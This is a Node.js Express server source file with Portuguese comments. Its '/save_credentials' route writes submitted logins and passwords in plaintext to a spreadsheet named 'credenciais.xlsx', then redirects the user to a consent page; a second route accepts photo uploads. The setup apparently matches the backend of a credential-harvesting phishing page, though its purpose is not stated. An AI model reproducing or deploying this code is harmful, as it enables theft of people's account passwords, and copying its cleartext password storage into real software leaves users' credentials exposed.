const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const XLSX = require('xlsx');
const multer = require('multer'); // Importa o multer para o upload de arquivos
const path = require('path'); // Para manipulação de caminhos

const app = express();
const port = 3000;

// Configura o multer para armazenar arquivos na pasta 'uploads'
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, 'uploads'); // Pasta onde as fotos serão armazenadas
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname)); // Nome do arquivo
    }
});
const upload = multer({ storage: storage });

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

const filePath = './credenciais.xlsx';

// Função para criar a planilha caso não exista
function createWorkbookIfNotExists() {
    if (!fs.existsSync(filePath)) {
        const wb = XLSX.utils.book_new();
        const ws = XLSX.utils.aoa_to_sheet([['Login', 'Senha']]);
        XLSX.utils.book_append_sheet(wb, ws, 'Credenciais');
        XLSX.writeFile(wb, filePath);
    }
}

// Rota para salvar credenciais
app.post('/save_credentials', (req, res) => {
    const login = req.body.login;
    const password = req.body.password;

    createWorkbookIfNotExists();

    const wb = XLSX.readFile(filePath);
    const ws = wb.Sheets['Credenciais'];

    const data = XLSX.utils.sheet_to_json(ws, { header: 1 });
    data.push([login, password]);

    const newWs = XLSX.utils.aoa_to_sheet(data);
    wb.Sheets['Credenciais'] = newWs;
    XLSX.writeFile(wb, filePath);

    // Redireciona para a nova página de consentimento
    res.redirect('/consent.html');
});

// Rota para upload de fotos
app.post('/upload', upload.single('photo'), (req, res) => {
    if (req.file) {
        res.send('Foto recebida com sucesso!');
    } else {
        res.status(400).send('Erro ao enviar a foto.');
    }
});

// Inicia o servidor
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
